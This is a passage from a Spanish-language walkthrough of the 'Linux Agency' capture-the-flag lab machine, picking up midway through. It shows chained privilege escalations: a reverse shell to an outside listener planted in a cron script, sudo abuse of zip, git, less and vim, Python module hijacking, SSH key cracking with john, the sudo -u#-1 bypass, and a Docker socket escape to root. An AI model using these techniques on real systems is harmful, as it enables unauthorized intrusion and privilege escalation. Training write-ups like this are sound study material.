*  *    * * *   root    echo "IyEvYmluL2Jhc2gKI2VjaG8gIkhlbGxvIDQ3IgpybSAtcmYgL2Rldi9zaG0vCiNlY2hvICJIZXJlIHRpbWUgaXMgYSBncmVhdCBtYXR0ZXIgb2YgZXNzZW5jZSIKcm0gLXJmIC90bXAvCg==" | base64 -d > /opt/scripts/47.sh;chown viktor:viktor /opt/scripts/47.sh;chmod +x /opt/scripts/47.sh;
#
~~~

- Somos dueños del script, el cual se ejecuta cada 30 segundos:
- Podemos modificarlo y añadir una instrucción para que nos ejecute una bash como ``dalia``:

~~~bash
viktor@linuxagency:~$ cat /opt/scripts/47.sh
#!/bin/bash
#echo "Hello 47"
rm -rf /dev/shm/
#echo "Here time is a great matter of essence"
rm -rf /tmp/
viktor@linuxagency:~$ nano /opt/scripts/47.sh
viktor@linuxagency:~$ cat /opt/scripts/47.sh
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.2.60.167/4444 0>&1"
~~~

- Si nos ponemos en escucha, ganaremos acceso:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Agency]
└─$ nc -lvnp 4444                  
listening on [any] 4444 ...
connect to [10.2.60.167] from (UNKNOWN) [10.10.217.42] 41086
bash: cannot set terminal process group (3290): Inappropriate ioctl for device
bash: no job control in this shell
dalia@linuxagency:~$ cat flag.txt
dalia{4a94a7a7bb4a819a63a33979926c77dc}
~~~

- Y aplicamos una sanitización:

~~~bash
script /dev/null -c bash
^Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
~~~

##### Silvio's Flag:

- Tenemos permisos de sudo como el usuario `silvio` para usar zip.
- Copiaremos su flag en `tmp` como comprimido:

~~~bash
dalia@linuxagency:~$ sudo -l
Matching Defaults entries for dalia on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dalia may run the following commands on linuxagency:
    (silvio) NOPASSWD: /usr/bin/zip
dalia@linuxagency:~$ sudo -u silvio /usr/bin/zip /tmp/silvio.zip /home/silvio/flag.txt
  adding: home/silvio/flag.txt (stored 0%) 
~~~

- Ahora descomprimimos y deberíamos ver el texto original:

~~~bash
dalia@linuxagency:~$ cd /tmp
dalia@linuxagency:/tmp$ unzip silvio.zip 
Archive:  silvio.zip
 extracting: home/silvio/flag.txt    
dalia@linuxagency:/tmp$ ls
home        systemd-private-e758e45bb2714f5682a06f07adb75f89-apache2.service-rzMObR           systemd-private-e758e45bb2714f5682a06f07adb75f89-systemd-timesyncd.service-tZc4ui               
silvio.zip  systemd-private-e758e45bb2714f5682a06f07adb75f89-systemd-resolved.service-QUUsgm
dalia@linuxagency:/tmp$ cd home/silvio/
dalia@linuxagency:/tmp/home/silvio$ cat flag.txt 
silvio{657b4d058c03ab9988875bc937f9c2ef}
~~~

- Al parecer aquí las contraseñas no funcionan para cambiar de usuario, así que generaremos una shell a través de `zip`:

~~~bash
alia@linuxagency:/tmp/home/silvio$ TF=$(mktemp -u)
dalia@linuxagency:/tmp/home/silvio$ sudo -u silvio /usr/bin/zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 37%)
sh: 0: getcwd() failed: No such file or directory
sh: 0: getcwd() failed: No such file or directory
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
sh: 0: getcwd() failed: No such file or directory
silvio@linuxagency:$ whoami
silvio
~~~

##### Reza's Flag:

- Fácil, solo nos aprovechamos de que podemos ejecutar `git` como `reza`:

~~~bash
silvio@linuxagency:~$ sudo -l
Matching Defaults entries for silvio on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User silvio may run the following commands on linuxagency:
    (reza) SETENV: NOPASSWD: /usr/bin/git
silvio@linuxagency:~$ sudo -u reza PAGER='sh -c "exec sh 0<&1"' git -p help
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
reza@linuxagency:/home/silvio$ cd
reza@linuxagency:~$ cat flag.txt 
reza{2f1901644eda75306f3142d837b80d3e}
~~~

##### Jordan's Flag:

~~~bash
reza@linuxagency:~$ sudo -l
Matching Defaults entries for reza on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User reza may run the following commands on linuxagency:
    (jordan) SETENV: NOPASSWD: /opt/scripts/Gun-Shop.py
~~~

- Podemos ejecutar un script como `jordan`, no podemos leerlo, pero si ejecutarlo:

~~~bash
reza@linuxagency:~$ ls -la /opt/scripts/Gun-Shop.py
-r-x------ 1 jordan jordan 454 Jan 12  2021 /opt/scripts/Gun-Shop.py
~~~

- Podemos revisar la PATH de Python, quizá nos sea útil más adelante:

~~~bash
reza@linuxagency:~$ python3 -c 'import sys;print(sys.path)'
['', '/usr/lib/python36.zip', '/usr/lib/python3.6', '/usr/lib/python3.6/lib-dynload', '/usr/local/lib/python3.6/dist-packages', '/usr/lib/python3/dist-packages']

reza@linuxagency:~$ sudo -u jordan /opt/scripts/Gun-Shop.py
Traceback (most recent call last):
  File "/opt/scripts/Gun-Shop.py", line 2, in <module>
    import shop
ModuleNotFoundError: No module named 'shop'
~~~

- Vemos que el programa busca un módulo shop, el cual no existe.
- Podemos cambiar la PATH y crear nuestro propio programa shop.
- Crearemos un script `shop.py` en la ruta `/tmp`:

~~~python
import os
os.system("bash -p")
~~~

- Y ahora, ejecutaremos el script indicándole la ruta modificada para que busque ahí:

~~~bash
reza@linuxagency:/tmp$ sudo -u jordan PYTHONPATH=/tmp /opt/scripts/Gun-Shop.py
jordan@linuxagency:/tmp$ cd
jordan@linuxagency:~$ cat flag.txt 
}3c3e9f8796493b98285b9c13c3b4cbcf{nadroj
jordan@linuxagency:~$ cat flag.txt | rev
jordan{fcbc4b3c31c9b58289b3946978f9e3c3}
~~~

##### Ken's Flag:

- Como `jordan` podemos usar `less` como sudo:

~~~bash
jordan@linuxagency:~$ sudo -l
Matching Defaults entries for jordan on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jordan may run the following commands on linuxagency:
    (ken) NOPASSWD: /usr/bin/less
~~~

- Solo debemos leer un archivo muy grande y generar una bash en la barra que genera el comando:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/a7663508-0aa8-4995-9e95-c0cb53570008)

- En este caso, hemos hecho:

~~~bash
sudo -u ken less /etc/passwd
~~~

- Y con esto tendríamos su flag:

~~~bash
jordan@linuxagency:~$ sudo -u ken less /etc/passwd
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
ken@linuxagency:/home/jordan$ cd
ken@linuxagency:~$ cat flag.txt 
ken{4115bf456d1aaf012ed4550c418ba99f}
~~~

##### Sean's Flag:

~~~bash
ken@linuxagency:~$ sudo -l
Matching Defaults entries for ken on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ken may run the following commands on linuxagency:
    (sean) NOPASSWD: /usr/bin/vim
ken@linuxagency:~$ sudo -u sean /usr/bin/vim -c ':!/bin/sh'

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
sean@linuxagency:/home/ken$ cd
sean@linuxagency:~$
~~~

- Aquí no encontré la flag, así que hice una búsqueda recursiva en toda la máquina, tardó demasiado pero al final apareció:

~~~bash
sean@linuxagency:~$ grep -iRl 'sean{' 2>/dev/null
/var/log/syslog.bak
sean@linuxagency:~$ cat /var/log/syslog.bak | grep sean
Jan 12 02:58:58 ubuntu kernel: [    0.000000] ACPI: LAPIC_NMI (acpi_id[0x6d] high edge lint[0x1]) : sean{4c5685f4db7966a43cf8e95859801281} VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==
~~~

- Y bueno, de una vez conseguimos la contraseña de `penelope`:

~~~bash
sean@linuxagency:~$ echo "VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==" | base64 -d
The password of penelope is p3nelope
~~~

##### Penelope's Flag:

~~~bash
sean@linuxagency:~$ su penelope
Password: 
penelope@linuxagency:/home/sean$ cd
penelope@linuxagency:~$ cat flag.txt 
penelope{2da1c2e9d2bd0004556ae9e107c1d222}
~~~

##### Maya's Flag:

- Listé permisos de SUID y encontré un binario interesante:

~~~bash
penelope@linuxagency:~$ find / -perm -4000 2>/dev/null
/snap/core/4486/bin/mount
/snap/core/4486/bin/ping
/snap/core/4486/bin/ping6
<---------- TRASH ----------->
/bin/su
/bin/mount
/home/penelope/base64
penelope@linuxagency:~$ ls -la /home/penelope/base64
-rwsr-sr-x 1 maya maya 39096 Jan 12  2021 /home/penelope/base64
~~~

- Una copia del binario `base64` creado por el usuario `maya`.
- Podemos obtener la flag si esta está en su lugar constante:

~~~bash
penelope@linuxagency:~$ /home/penelope/base64 /home/maya/flag.txt | base64 -d 
maya{a66e159374b98f64f89f7c8d458ebb2b}
penelope@linuxagency:~$ su maya
Password: 
maya@linuxagency:/home/penelope$ cd
maya@linuxagency:~$
~~~

##### Robert's Flag:

- Tenemos un antiguo directorio con un par de llaves, pública y privada.
- Presuntamente ambas pertenecen a `robert`:

~~~bash
maya@linuxagency:~$ ls
elusive_targets.txt  examples.desktop  flag.txt  old_robert_ssh
maya@linuxagency:~$ cd old_robert_ssh/
maya@linuxagency:~/old_robert_ssh$ ls
id_rsa  id_rsa.pub
maya@linuxagency:~/old_robert_ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,7903FE7BDBA051C4B0BF7C6C5C597E0B

iRzpH6qjXDvmVU5wwYU7TQfyQHIqYzR0NquznZ3OiXyaSOaovgPXdGP3r50vfIV6
i07H7ZSczz4nuenYJGIE7ZfDYtVVA9R6IdcIZecYF2L3OfHoR/ghGOlbLC+Hyvky
RMcrEgajpdV7zCPRHckiBioxzx1K7kfkinyiSBoV9pz9PuAKo47OHtKDdtjWFV+A
PkiWa8aCmAGShC9RZkZLMRhVkR0TZGOgJGTs/MncopyJJ6TgJ9AzHcQo3vcf5A3k
7f3+9Niw7mMFmWrU35WOBpAynGkK9eDTvt/DoIMJcT9KL1BBaEzReO8mETNqfT5G
QncO/4tBSG7QaU6pQkd+UiZCtltp47Tu9hwSEsxDIleespuBn9mDHrYtBDC8jEBq
nqm0sDdYOPzjUTMDSJgqmLZ0lzagTa1OMNUlvRAz5Sde4bKAoYRgVvBWJ4whn4H+
OIHhFQ6tbCVr/0tosYrc9ehM4N4TiJ0SyfrP1XmDo8bud+UtNf2Tf/vKjYT9FP+/
+HqrIn1ou4Cvvu/jPbwVU8Ejh4CX/TJhDK6JqLzsqOp0M8jBccCR+zrRXcZsKLnG
JUTqxKwML7FhRiAgeTmOUx43XVOvzrNOmZ+8EmbmE4fW5x9UKR2nzKgILwHApayK
dmKbym96uSoQOm4KycXjoDVw9nAgRQQVQ+3Ndy0JwuyXN7keNcesEN5hb5VNN9VP
jp+mS+c/CctyLSgZkGJif2r2N+3x2AZFkDs059sPQB8UGvI4w41qGBubfsHAvVPW
KH+HAgj1i1RM0/XZ5XKIl0K4iO/eQ5xTAPah51f6LCYnZo/G6fM7IT72k0Z0KMZ8
EiySGtRCcv7vrkVRjkgmw4lAeGLJ9FBOw8IdKa9ftYJauKY/E0Gs1Qhefl+3K2BB
4PJ+Pr/doZ3Dkq4Q/YPrKnbKEbs/3Zvbu/XT5y+joS6tzF3Raz6xW0kg3NyaA1B5
V5zoj0/tnBb9Lc0YH7s2QT+9drFH4w8tb5kjyd1jlER3Hs4m31cniCsxDlKoTwk/
uAGurW23NZ4QF+3/PgjZRhudpNjcOP69Ys2XGAecxO9uBx9JjPR/cn9c54v4s/kH
n6v24eXF2uGGlEsvEpzIpk6UDap7YoxnRKIPo0mZ5G7/MS9+RL6dv9rmJ6IQd7Cr
fPjhz8snqfuGCAVveKWIOPnlfYiYJ2nQ6yA1Soyt9outfLbwIzDh7e+eqaOP2amh
rGCqwxrj9cj4sH/MzvKZVARzH3hs39wRmoEtx9ML/uXsp22DqUODOxc7cdUlRs99
zTj8CHFpM6X+ihSF33Eg0qBJwkyWzdKQiFKNTm8ld4wzov1tdKeRC7nlUh5F4lkf
yExiUTllJq8pJ3JAC/LEvQXF041fcmQ0RvoL1n3nyqIvvOjuY7UDZrcmuWQ+epdE
APKzOgkxhEqsozt8kj810m3bjIWngenwRcGL6M1ZsvwT1YwGUKG47wX2Ze3tp3ge
K4NUD9GdZJIiu8qdpyMIFKR9MfM3Pur5JRUK0IjCD43xk9p6LZYK00C3N2F4exwM
Ye5kHYeqZLpl4ljZSBoNtEK1BbYSffBt2XdoQsAvft1iwjdtZ9E644oTp9QYjloE
-----END RSA PRIVATE KEY-----
~~~

- Nos copiaremos su llave privada a nuestra máquina atacante.
- Una vez hecho esto, utilizaremos `ssh2john` para convertirla a formato hash:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Agency]
└─$ ssh2john robert_key > hash  
~~~

- Y con esto hecho, bastará con crackear la contraseña:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Agency]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
industryweapon   (robert_hash)     
1g 0:00:00:03 DONE (2024-02-23 00:06) 0.3174g/s 2327Kp/s 2327Kc/s 2327KC/s induzito..industriales08
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
~~~

- La conexión por ssh parecía no funcionar, entonces intenté buscar alguna conexión interna a un puerto, con `netstat`, pero la máquina no lo tenía instalado.
- Al final utilicé `ss`:

~~~bash
maya@linuxagency:~/old_robert_ssh$ ss -tuln
Netid State   Recv-Q  Send-Q         Local Address:Port      Peer Address:Port  
udp   UNCONN  6144    0              127.0.0.53%lo:53             0.0.0.0:*     
udp   UNCONN  0       0         10.10.233.220%eth0:68             0.0.0.0:*     
udp   UNCONN  0       0                    0.0.0.0:68             0.0.0.0:*     
udp   UNCONN  0       0                    0.0.0.0:631            0.0.0.0:*     
udp   UNCONN  0       0                    0.0.0.0:35987          0.0.0.0:*     
udp   UNCONN  13824   0                    0.0.0.0:5353           0.0.0.0:*     
udp   UNCONN  0       0                       [::]:49180             [::]:*     
udp   UNCONN  6912    0                       [::]:5353              [::]:*     
tcp   LISTEN  0       128                127.0.0.1:39559          0.0.0.0:*     
tcp   LISTEN  0       128                127.0.0.1:2222           0.0.0.0:*     
tcp   LISTEN  0       128                127.0.0.1:80             0.0.0.0:*     
tcp   LISTEN  0       128            127.0.0.53%lo:53             0.0.0.0:*     
tcp   LISTEN  0       128                  0.0.0.0:22             0.0.0.0:*     
tcp   LISTEN  0       5                  127.0.0.1:631            0.0.0.0:*     
tcp   LISTEN  0       128                     [::]:22                [::]:*     
tcp   LISTEN  0       5                      [::1]:631               [::]:* 
~~~

- Intenté usar el puerto 2222 para entablar una conexión local, ya que me pareció lo más obvio:

~~~bash
maya@linuxagency:~/old_robert_ssh$ ssh robert@localhost -p2222
The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.
ECDSA key fingerprint is SHA256:tHRuLtVLrzk2hp6qNgrziq6NZKkEQY+rN1E1J7K7lIE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[localhost]:2222' (ECDSA) to the list of known hosts.
robert@localhost's password: 
Last login: Tue Jan 12 17:02:07 2021 from 172.17.0.1
robert@ec96850005d6:~$ hostname -I
172.17.0.2 
~~~

- Y aparecemos en un docker... genial...

<center>
![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/6182b8b4-b005-4525-939b-0843b8589cb9)
</center>

##### User Flag:

- Por lo menos han sido piadosos con nosotros, no puede existir escalada de privilegios más fácil:

~~~bash
robert@ec96850005d6:~$ sudo -l
Matching Defaults entries for robert on ec96850005d6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on ec96850005d6:
    (ALL, !root) NOPASSWD: /bin/bash
~~~

- O eso parecía:

~~~bash
robert@ec96850005d6:~$ sudo /bin/bash
[sudo] password for robert: 
Sorry, user robert is not allowed to execute '/bin/bash' as root on ec96850005d6.
~~~

- Si enumeramos la versión de sudo podemos ver algo interesante, gracias a [exploitdb](https://www.exploit-db.com/exploits/47502) por el articulo de security bypass para esta versión:

~~~bash
robert@ec96850005d6:~$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
robert@ec96850005d6:~$ sudo -u#-1 /bin/bash
~~~

- Obtenemos la flag de ``user``:

~~~bash
root@ec96850005d6:~# cat robert.txt 
You shall not pass from here!!!

I will not allow ICA to take over my world.

root@ec96850005d6:~# cd /root
root@ec96850005d6:/root# ls
success.txt  user.txt
root@ec96850005d6:/root# cat user.txt 
user{620fb94d32470e1e9dcf8926481efc96}
~~~

##### Root Flag:

- Es obvio que debemos salir de nuestro docker, pero no hay ningún comando.
- Busqué archivos con nombre docker y encontré el binario en `/tmp`

~~~bash
root@ec96850005d6:/root# find / -name docker 2>/dev/null
/run/docker
/tmp/docker
~~~

- Pude listar las imagenes:

~~~bash
root@ec96850005d6:/tmp# ./docker ps
CONTAINER ID        IMAGE               COMMAND               CREATED             STATUS              PORTS                    NAMES
ec96850005d6        mangoman            "/usr/sbin/sshd -D"   3 years ago         Up About an hour    127.0.0.1:2222->22/tcp   kronstadt_industries
~~~

- Tenemos una cosa clara, si podemos listar imágenes desde el docker, significa que tenemos capacidades de compartir el socket con la máquina original, por lo que podemos modificar o crear imágenes, procesos, etc.
- Creamos un nuevo proceso a partir de la imágen `mangoman` que podemos listar, esto lo haremos montando la raíz de la máquina original en este, puesto que podemos compartir recursos debido a los permisos que se le han asignado al docker en el que estamos:

~~~bash
root@ec96850005d6:/tmp# ./docker run --rm -dit -v /:/mnt/root --name BreakOut mangoman
~~~

- Y ahora existen dos procesos:

~~~bash
root@ec96850005d6:/tmp# ./docker ps
CONTAINER ID        IMAGE               COMMAND               CREATED             STATUS              PORTS                    NAMES
4f1eef2b296a        mangoman            "/usr/sbin/sshd -D"   55 seconds ago      Up 54 seconds       22/tcp                   BreakOut
ec96850005d6        mangoman            "/usr/sbin/sshd -D"   3 years ago         Up 2 hours          127.0.0.1:2222->22/tcp   kronstadt_industries
~~~

- Ahora, nos metemos al docker que hemos creado, con una shell interactiva:

~~~bash
root@ec96850005d6:/tmp# ./docker exec -it BreakOut bash
root@4f1eef2b296a:/# cd /
root@4f1eef2b296a:/# ls
bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
boot  etc  lib   media  opt  root  sbin  sys  usr
~~~

- Vamos a asignarle permisos de SUID al binario `/bin/bash` de la máquina real:

~~~bash
root@4f1eef2b296a:/# cd mnt/root
root@4f1eef2b296a:/mnt/root# ls
bin    etc         initrd.img.old  media  root  srv       usr
boot   flag.txt    lib             mnt    run   swapfile  var
cdrom  home        lib64           opt    sbin  sys       vmlinuz
dev    initrd.img  lost+found      proc   snap  tmp
root@4f1eef2b296a:/mnt/root# cd bin/
root@4f1eef2b296a:/mnt/root/bin# chmod u+s bash
~~~

- Y si todo ha salido bien, y nos conectamos como `agent47` desde ssh, deberíamos tener una bash privilegiada:

~~~bash
agent47@linuxagency:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash
agent47@linuxagency:~$ bash -p
bash-4.4# whoami
root
bash-4.4# hostname -I
10.10.233.220 172.17.0.1 
bash-4.4# cd /root
bash-4.4# ls
message.txt  root.txt
bash-4.4# cat root.txt 
root{62ca2110ce7df377872dd9f0797f8476}
bash-4.4# 
~~~

- Y así habríamos escapado del docker, y completado las 41 banderas.
- Es una máquina bastante accesible para principiantes, su verdadera dificultad es la duración más que nada, pero sin dudas es perfecta para retomar conceptos que van escalando de dificultad gradualmente.
